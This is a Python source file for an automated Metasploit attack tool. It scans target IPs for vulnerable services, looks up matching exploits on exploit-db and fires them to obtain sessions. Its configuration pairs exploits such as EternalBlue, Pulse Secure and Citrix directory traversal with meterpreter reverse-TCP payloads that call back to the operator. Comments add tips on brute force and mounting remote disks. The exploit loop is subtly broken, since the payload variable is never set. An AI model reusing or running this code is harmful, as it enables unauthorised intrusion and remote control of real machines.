from metasploit_script import *
from json_data_processing_script import *
from web_query_and_process_script import *

import socket
import time

####################################DICTONNARY OF EXPLOITs CONFIG FOR AUTOMATISATION####################################

dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
    'RHOSTS': '',
    'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
    'Payload': 'windows/x64/meterpreter/reverse_tcp',
    'LHOST': ''
},
    'windows/smb/ms17_010_eternalblue_win8': {
        'RHOSTS': '',
        'Payload': 'windows/x64/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_jmx_server': {
        'RHOSTS': '',
        'RPORT': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/smb/ms17_010_psexec': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_rmi_server': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/misc/java_rmi_server',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_connectionid_write': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_apps_mngr': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/misc/manageengine_eventlog_analyzer_rce': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/phpmyadmin_null_termination_exec': {
        'RHOSTS': '',
        'Payload': 'php/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/manageengine_sd_uploader': {
        'RHOSTS': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/ftp/vermillion_ftpd_port': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_appmanager_exec': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/struts_dmi_rest_exec': {
        'RHOSTS': '',
        'RPORT': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOSTS': ''
    },
    ############################################TOP EXPLOITS 2016-2020 USA############################################
    'linux/http/pulse_secure_cmd_exec': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/gather/pulse_secure_file_disclosure',
        'Payload': 'linux/x64/meterpreter_reverse_tcp',
        'LHOSTS': ''
    },
    'linux/http/citrix_dir_traversal_rce': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/http/citrix_dir_traversal',
        'Payload': 'python/meterpreter/reverse_tcp',
        'LHOSTS': ''
    }

}

###################################################DICTIONNARY CONFIG SCAN##############################################
dictionnary_config_scanner = {
    '21': {
        'auxiliary/scanner/ftp/ftp_version': {
            'RHOSTS': '',
            'To_get': 'FTP Banner'
        },
        'auxiliary/scanner/ftp/anonymous': {
            'RHOSTS': '',
            'To_get': 'Anonymous READ'
        }

    },
    '22': {
        'auxiliary/scanner/ssh/ssh_version': {
            'RHOSTS': '',
            'To_get': 'version',
            'Info': 'mind if the version is lower than 7.7, you can try to enumerate the user with a user_file.txt'
        }
    },
    '25': {
        'auxiliary/scanner/smtp/smtp_version': {
            'RHOSTS': '',
            'To_get': 'version',
            'Info': 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service'
        }
    },
    '161': {
        'auxiliary/scanner/snmp/snmp_login': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'Successful'

        },
        'auxiliary/scanner/snmp/snmp_enum': {
            'RHOSTS': '',
            'THREADS': '255',
            'COMMUNITY': '',
            'To_get': 'data',

        }
    },
    '445': {
        'scanner/smb/smb_version': {
            'RHOSTS': '',
            'To_get': 'running',
            'Info': 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service ; also, if the systeme is linux, try exploit/linux/samba/is_known_pipename'
        },
        'auxiliary/scanner/smb/smb_ms17_010': {
            'RHOSTS': '',
            'To_get': 'data'
        },
    },
    '3306': {
        'auxiliary/scanner/mysql/mysql_version': {
            'RHOSTS': '',
            'To_get': 'MySQL'
        }

    },
    '111': {
        'auxiliary/scanner/nfs/nfsmount': {
            'RHOSTS': '',
            'To_get': 'NFS',
            'Info': 'mind you might be able to mount the disk of the remote machine thanks to user@ubuntu# mount -t nfs @ip:path_according_to_scan_result /path_in_your_machine'
        }
    },
    '3389': {
        'auxiliary/scanner/rdp/cve_2019_0708_bluekeep': {
            'RHOSTS': '',
            'To_get': 'vulnerable'
        }
    },
    '5900': {
        'auxiliary/scanner/vnc/vnc_none_auth': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'data'
        }
    },
    '23': {
        'auxiliary/scanner/telnet/telnet_version': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'TELNET'
        },
        'auxiliary/scanner/telnet/telnet_encrypt_overflow': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'VULNERABLE'
        },

    }

}


# 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
############################################AUTO SCAN/EXPLOIT PORT PART#################################################
# 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000


#####################################################AUTO SCAN PART#####################################################

class Automate:
    def __init__(self):
        self.env = Msfrpc()

        # launch environment and make it ready for use
        self.env.launch_metasploit()
        self.env.connection_rpc()
        self.current_board = None

    def script_automate_scan(self):
        '''

        @return: list data from the metasploit console, the rpc client and the console associated to this client
        '''
        # flag 161 type access
        flag_161_access = ''

        # dictionnary of data
        dict_of_ip = {}
        dict_of_data = {}
        dict_tmp = {}

        # pdb.set_trace()

        # check ip_port vulnerability
        dict_port_ip_vuln = look_for_port()

        # pdb.set_trace()
        #######################################CHECK OPENED PORT####################################
        for ip, liste_port_vuln in dict_port_ip_vuln.items():
            liste_port_vuln.append('161')  ##TRICK FOR 161 DUE TO THE FACT THAT 161 MIGHTS RESPOND EVEN IF IT IS CLOSED
            ################LOOK UPON DICTIONNARY SCANNER##################
            for port_num in [*dictionnary_config_scanner]:
                if port_num in liste_port_vuln:
                    dico_port_num = dictionnary_config_scanner[port_num]
                    for scanner in [*dico_port_num]:
                        #############ENTER THE SCANNER IN THE CONSOLE AND CONFIGURE IT###############
                        # pdb.set_trace()
                        self.env.console.write('use ' + scanner)
                        time.sleep(1)
                        dico_scanner = dico_port_num[scanner]
                        # print(scanner)
                        for arg, value in dico_scanner.items():
                            if arg == 'RHOSTS':
                                self.env.console.write('set RHOSTS ' + str(ip))
                                time.sleep(1)
                            if arg == 'THREADS':
                                self.env.console.write('set THREADS ' + value)
                                time.sleep(1)
                            if arg == 'COMMUNITY':
                                if flag_161_access == 'true private':
                                    self.env.console.write('set COMMUNITY private')
                                else:
                                    self.env.console.write('set COMMUNITY public')
                                time.sleep(1)
                        # pdb.set_trace()
                        ############RUN THE SCANNER##############
                        self.env.console.write('run')
                        time.sleep(1)  #######forced to slow down the process due to rpc latency :(
                        while self.env.console.is_busy() == True:
                            time.sleep(3)  #######same as the above commentary
                        #############GET THE DATA#############
                        data_version = self.env.console.read()
                        # pdb.set_trace()
                        version = 'None'
                        ######IF ALL DATA IS DESIRED###########
                        if dico_scanner['To_get'] == 'data':
                            dict_tmp[scanner] = data_version['data']
                        ####LOOK FOR 161 CONNEXION POSSIBILITY###"
                        elif scanner == 'auxiliary/scanner/snmp/snmp_login' and 'private' in data_version['data']:
                            flag_161_access = 'true private'
                        #####GET SPECIFIED DATA IN THE ATTRIBUTE 'To_get' OF THE DICTIONNARY OF THE SCANNER CONFIG#####
                        elif dico_scanner['To_get'] in data_version['data']:
                            spliter = data_version['data'].split('\n')
                            for line in spliter:
                                if dico_scanner['To_get'] in line:
                                    version = line
                            dict_tmp[scanner] = version
                        ####IF NOTHING WAS FOUND#####
                        elif version == 'None':
                            dict_tmp[scanner] = version
                        try:
                            dict_tmp['info'] = dico_scanner['Info']
                        except:
                            a = None
                    # print(dict_tmp)
                    dict_of_data[port_num] = dict_tmp
                    # RESET DICT TMP
                    dict_tmp = {}

            dict_of_ip[ip] = dict_of_data
            # RESET DICT DATA
            dict_of_data = {}

        return dict_of_ip

    # 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    ###############################################EXPLOIT-DB PART##########################################################
    # 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

    ###############################################EXPLOIT-DB SEARCH########################################################
    def get_board_exploit(self):
        '''

        @param client: rpc client from metasploit console
        @return: dict of exploits which might work
        '''
        # pdb.set_trace()
        board_of_exploit = {}
        tmp = {}
        list_of_ip = look_for_ip_of_nmap_scan()
        for ip in list_of_ip:
            data = get_port_id_and_name(ip)  # json script
            print(data, '\n')
            data2 = create_requete_for_exploitdb(data)  # json script
            print(data2, '\n')
            data3 = improve_research(data2)  # json script
            print(data3, '\n')
            for port, query in data3.items():
                table = exploitdb_query(query)  # query script
                output_rows = retrieve_from_html_exploitdb(table)  # query script
                exploit = self.env.retrieve_exploit_from_db_info(output_rows)  # metasploit_script
                if exploit != -1:
                    tmp[port] = exploit
            board_of_exploit[str(ip)] = tmp
        self.current_board = board_of_exploit
        return board_of_exploit

    def brute_force_exploit(self):
        '''

        @param board_of_exploit: dict of exploits which might work
        @param client: rpc client from metasploit console
        @return: dict of sessions cretaed thanks to exploits in board_o_exploit
        '''
        # !!!!!!!!!!!!!!!!!!!!!!GLOBAL DICTIONNARY CHECK AT THE TOP OF THE CODE !!!!!!!!!!!!!!!!!!!!!!!!#
        ####global variable####
        global session_key_client

        ###########VARIABLES FOR THIS DEFINITION##############
        session_key_client = None

        ####################################GET IP HOSTNAME#########################################
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        hostname = s.getsockname()[0]
        s.close()

        for ip in [*self.current_board]:
            for port, list_of_exploit in self.current_board[ip].items():
                for exploit in list_of_exploit:
                    if exploit in [*dictionnary_config_exploit]:
                        dico_config = dictionnary_config_exploit[exploit]
                        #############################################CONFIG EXPLOIT###################################
                        exploit_running = self.env.run_an_exploit(exploit)
                        payload = None
                        for arg, value in dico_config.items():
                            if arg == 'RHOSTS':
                                self.env.change_option_exploit(arg, ip, 'STR')
                            if arg == 'CheckModule':
                                self.env.change_option_exploit(arg, dico_config[arg], 'STR')
                            if arg == 'RPORT':
                                self.env.change_option_exploit(arg, port, 'STR')
                            if arg == 'Payload':
                                self.env.run_a_payload(dico_config[arg])
                            if arg == 'LHOST' and payload is not None:
                                self.env.change_option_payload(arg, hostname, 'STR')
                            # print(exploit_running.runoptions)
                        ############################################RUN EXPLOIT######################################
                        # pdb.set_trace()
                        if payload is not None:
                            self.env.execute_exploit()

        return self.env.client.sessions.list
